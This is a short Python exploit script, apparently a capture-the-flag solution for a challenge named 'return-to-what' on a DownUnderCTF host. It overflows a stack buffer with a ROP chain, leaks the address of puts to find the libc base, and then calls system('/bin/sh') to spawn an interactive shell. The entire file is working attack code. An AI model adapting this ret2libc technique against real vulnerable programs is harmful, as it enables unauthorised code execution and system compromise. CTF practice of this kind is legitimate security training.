from roppy import *
p = remote("chal.duc.tf", 30003)

context.arch = "amd64"
elf = ELF("return-to-what")
libc = ELF("libc6_2.27-3ubuntu1_amd64.so")


pop_rdi = 0x000000000040122b


payload = b"A"*56

# Leak puts by doing `puts(puts@got)`

payload += p64(pop_rdi)
payload += p64(elf.got("puts"))
payload += p64(elf.plt("puts")) 

# Calling vuln again

payload += p64(elf.function("vuln")) 

p.sendlineafter("?\n", payload)

# Recieving the leaked address and parsing it

leak = u64(p.recv(6).ljust(8, b"\x00"))
log.info("LEAK:   0x%x" %(leak))

libc.address = leak - libc.function("puts")

payload = b"A"*56

# Calling the `system("/bin/sh")`
payload += p64(0x0000000000401016) # ret;
payload += p64(pop_rdi)
payload += p64(libc.search(b"/bin/sh\x00"))
payload += p64(libc.function('system'))


p.sendlineafter("?\n", payload)
p.interactive()
